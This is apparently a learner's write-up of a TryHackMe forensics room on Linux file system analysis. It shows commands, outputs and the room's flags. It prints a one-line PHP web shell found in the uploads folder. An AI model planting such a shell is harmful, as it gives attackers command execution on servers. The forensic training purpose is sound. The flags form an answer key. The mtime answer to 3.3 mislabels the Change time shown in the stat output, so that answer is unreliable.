<p align="center">November 8, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{186}}$$-day-streak in  <a href="https://tryhackme.com/r/hacktivities">TryHackMe</a>.</p>

<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{ Linux File System Analysis }}$$
</h1>
<p align="center">Perform real-time file system analysis on a Linux system to identify an attacker's artefacts.</p>
<p align="center">Access this 🆓 TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/linuxfilesystemanalysis">Linux File System Analysis</a>.</p><br>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/fdaa9e0d-9485-4f5d-a6eb-33c69aa9cee9">
  <img height="150px" src="https://github.com/user-attachments/assets/4c008c9d-040a-4590-93f0-4e4e42e557cb">
</p>

<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Introduction](#1) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Investigation Setup](#2) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [GoldenEye Operators Training](#3) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Privilege Escalation](#4) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Room Complete](#5) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [My Journey](#6) </p>

<br>
<br>
<br>
<h2>Task 1. Introduction<a id='1'></a></h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 1.1. <em>I'm ready to continue!</em><br><a id='1.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>
<h2>Task 2. Investigation Setup<a id='2'></a></h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 2.1. <em>After updating the <code>PATH</code> and <code>LD_LIBRARY_PATH</code> environment variables, run the command >code>check-env</code>. What is the flag that is returned in the output?</em><br><a id='1.1'></a>
>> <code><strong>THM{5514ec4f1ce82f63867806d3cd95dbd8}</strong></code>

<pre><code>$ investigator@ip-[Target_IP]:~$ export PATH=/mnt/usb/bin:/mnt/usb/sbin
investigator@ip-[Target_IP]:~$ export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64
investigator@ip-[Target_IP]:~$ check-env
THM{5514ec4f1ce82f63867806d3cd95dbd8}
</code></pre>

<h2>Task 3. Files, Permissions, and Timestamps<a id='3'></a></h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>

<pre><code>$  ls -al /var/www/html/
total 32
drwxr-xr-x 4 root     root      4096 Feb 12  2024 .
drwxr-xr-x 3 root     root      4096 Feb 12  2024 ..
drwxr-xr-x 2 www-data www-data  4096 Feb 13  2024 assets
-rw-r--r-- 1 root     root     10918 Feb 12  2024 index.html
-rwxr-xr-x 1 www-data www-data   905 Feb 12  2024 upload.php
drwxr-xr-x 2 www-data www-data  4096 Feb 13  2024 uploads
investigator@ip-10-10-229-35:~$ ls -al var/www/html/uploads
ls: cannot access 'var/www/html/uploads': No such file or directory
investigator@ip-10-10-229-35:~$ ls -al /var/www/html/uploads
total 224
drwxr-xr-x 2 www-data www-data 4096 Feb 13  2024 .
drwxr-xr-x 4 root     root     4096 Feb 12  2024 ..
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 ABHz3aj.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 AhVpDoS.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 AqLnBvC.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 AsDfGhJ.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 AzSxWqE.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 BcFvGtR.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 BcNmLoP.jpeg
...
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 YmLnXhP.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 YtGfHjK.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 ZtXcVbN.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 ZxVbNmQ.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 ZxXcVuY.jpeg
-rw-r--r-- 1 www-data www-data   30 Feb 13  2024 b2c8e1f5.phtml
</code></pre>


<pre><code>investigator@ip-10-10-229-35:~$ ls -al /var/www/html/uploads | grep -v ".jpeg"
total 224
drwxr-xr-x 2 www-data www-data 4096 Feb 13  2024 .
drwxr-xr-x 4 root     root     4096 Feb 12  2024 ..
-rw-r--r-- 1 www-data www-data   30 Feb 13  2024 b2c8e1f5.phtml
</code></pre>

<pre><code>investigator@ip-10-10-229-35:~$ cat /var/www/html/uploads/b2c8e1f5.phtml 
<?php system($_GET['cmd']);?>
</code></pre>

<pre><code>investigator@ip-10-10-229-35:~$ investigator@ip-10-10-229-35:~$ find / -user www-data -type f 2>/dev/null | less
/var/www/html/assets/reverse.elf
/var/www/html/uploads/MzCxVeR.jpeg
/var/www/html/uploads/AzSxWqE.jpeg
/var/www/html/uploads/QaWsEdR.jpeg
/var/www/html/uploads/TyHjKlM.jpeg
/var/www/html/uploads/PrTgHfD.jpeg
/var/www/html/uploads/YmLnXhP.jpeg
/var/www/html/uploads/LuDjYnW.jpeg
/var/www/html/uploads/LvXcBvN.jpeg
/var/www/html/uploads/AsDfGhJ.jpeg
/var/www/html/uploads/CoSaBmQ.jpeg
/var/www/html/uploads/XkFgHtD.jpeg
/var/www/html/uploads/RfTbMeG.jpeg
/var/www/html/uploads/AqLnBvC.jpeg
/var/www/html/uploads/WzRmDnT.jpeg
/var/www/html/uploads/DnCvBzX.jpeg
/var/www/html/uploads/ZxVbNmQ.jpeg
/var/www/html/uploads/ABHz3aj.jpeg
/var/www/html/uploads/ZxXcVuY.jpeg
/var/www/html/uploads/XcVbNmQ.jpeg
/var/www/html/uploads/KtXoRlN.jpeg
/var/www/html/uploads/RoNpIqU.jpeg
/var/www/html/uploads/XcVbNkL.jpeg
/var/www/html/uploads/VbNmLoP.jpeg
/var/www/html/uploads/YtGfHjK.jpeg
/var/www/html/uploads/BcNmLoP.jpeg
/var/www/html/uploads/LrOjfHa.jpeg
/var/www/html/uploads/LmKdFgH.jpeg
/var/www/html/uploads/FgHyJuK.jpeg
/var/www/html/uploads/BcFvGtR.jpeg
/var/www/html/uploads/DvBnMcP.jpeg
/var/www/html/uploads/QwErTyU.jpeg
/var/www/html/uploads/NcVbOpQ.jpeg
/var/www/html/uploads/FeWcNzT.jpeg
/var/www/html/uploads/PwSaBcZ.jpeg
/var/www/html/uploads/FgHjKlM.jpeg
/var/www/html/uploads/JnKmLoP.jpeg
/var/www/html/uploads/PqAwSdE.jpeg
/var/www/html/uploads/LkMjNhB.jpeg
/var/www/html/uploads/ZtXcVbN.jpeg
/var/www/html/uploads/MqQwErT.jpeg
/var/www/html/uploads/AhVpDoS.jpeg
/var/www/html/uploads/PoGmHsR.jpeg
/var/www/html/uploads/JyGtFdS.jpeg
/var/www/html/uploads/QeRtYuI.jpeg
/var/www/html/uploads/JiRpKaW.jpeg
/var/www/html/uploads/VwPyLoR.jpeg
/var/www/html/uploads/HjGfSdA.jpeg
/var/www/html/uploads/TRWaPSB.jpeg
/var/www/html/uploads/UiJhYtG.jpeg
/var/www/html/uploads/EpSjZxM.jpeg
/var/www/html/uploads/PlKjHgF.jpeg
/var/www/html/uploads/b2c8e1f5.phtml
/var/www/html/uploads/EsKyLbQ.jpeg
/var/www/html/uploads/GQzVDrM.jpeg
/var/www/html/upload.php
...
  
</code></pre>

<pre><code> ls -l /var/www/html/assets/reverse.elf 
-rwxr-xr-x 1 www-data www-data 250 Feb 13  2024 /var/www/html/assets/reverse.elf
</code></pre>

<pre><code> ls -l /var/www/html/assets/reverse.elf 
-rwxr-xr-x 1 www-data www-data 250 Feb 13  2024 /var/www/html/assets/reverse.elf
</code></pre>investigator@ip-10-10-229-35:~$ ls -l /var/www/html/assets/reverse.elf 
-rwxr-xr-x 1 www-data www-data 250 Feb 13  2024 /var/www/html/assets/reverse.elf
investigator@ip-10-10-229-35:~$ ^C
investigator@ip-10-10-229-35:~$ exiftool /var/www/html/assets/reverse.elf 
ExifTool Version Number         : 11.88
File Name                       : reverse.elf
Directory                       : /var/www/html/assets
File Size                       : 250 bytes
File Modification Date/Time     : 2024:02:13 00:26:28+00:00
File Access Date/Time           : 2024:02:13 00:32:59+00:00
File Inode Change Date/Time     : 2024:02:13 00:34:50+00:00
File Permissions                : rwxr-xr-x
File Type                       : ELF executable
File Type Extension             : 
MIME Type                       : application/octet-stream
CPU Architecture                : 64 bit
CPU Byte Order                  : Little endian
Object File Type                : Executable file
CPU Type                        : AMD x86-64
investigator@ip-10-10-229-35:~$ 
</code></pre>


<pre><code>investigator@ip-10-10-229-35:~$ md5sum /var/www/html/assets/reverse.elf 
c6cbdba1c147fbb7239284b7df2aa653  /var/www/html/assets/reverse.elf
</code></pre>

<pre><code>investigator@ip-10-10-229-35:~$ sha256sum /var/www/html/assets/reverse.elf
ee0ea8d8bc205c4e2e2cc9ff7ddb71dee22ac0a50c2042701d49e565e0821410  /var/www/html/assets/reverse.elf
</code></pre>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>

> 3.1. <em>To practice your skills with the <code>find</code> command, locate all the files that the user <code>bob</code> created in the past 1 minute. Once found, review its contents. What is the flag you receive?</em><br><a id='3.1'></a>
>> <code><strong>THM{0b1313afd2136ca0faafb2daa2b430f3}</strong></code>

<pre><code>investigator@ip-10-10-229-35:~$ find / -user bob -type f -cmin -1 > bob
</code></pre>

<pre><code>investigator@ip-10-10-229-35:~$ cat bob | grep .txt
investigator@ip-10-10-229-35:~$ cat /var/tmp/findme.txt
THM{0b1313afd2136ca0faafb2daa2b430f3}
</code></pre>

> 3.2. <em>Extract the metadata from the <code>reverse.elf</code> file. What is the file's MIME type?</em><br><a id='3.2'></a>
>> <code><strong>application/octet-stream</strong></code>

<pre><code>investigator@ip-10-10-229-35:~$ exiftool /var/www/html/assets/reverse.elf
ExifTool Version Number         : 11.88
File Name                       : reverse.elf
Directory                       : /var/www/html/assets
File Size                       : 250 bytes
File Modification Date/Time     : 2024:02:13 00:26:28+00:00
File Access Date/Time           : 2024:11:08 19:55:06+00:00
File Inode Change Date/Time     : 2024:02:13 00:34:50+00:00
File Permissions                : rwxr-xr-x
File Type                       : ELF executable
File Type Extension             : 
MIME Type                       : application/octet-stream
CPU Architecture                : 64 bit
CPU Byte Order                  : Little endian
Object File Type                : Executable file
CPU Type                        : AMD x86-64
</code></pre>


> 3.3. <em>Run the <code>stat</code> command against the <code>/etc/hosts</code> file on the compromised web server. What is the full <code>Modify Timestamp (mtime)</code> value?</em><br><a id='3.3'></a>
>> <code><strong>2020-10-26 23:32:25.957900650 +0000</strong></code>

<pre><code>investigator@ip-10-10-229-35:~$ stat /etc/hosts
  File: /etc/hosts
  Size: 221       Blocks: 8          IO Block: 4096   regular file
Device: ca01h/51713dInode: 49          Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2024-11-08 19:31:25.108000000 +0000
Modify: 2020-10-26 21:10:44.000000000 +0000
Change: 2020-10-26 23:32:25.957900650 +0000
 Birth: -
</code></pre>




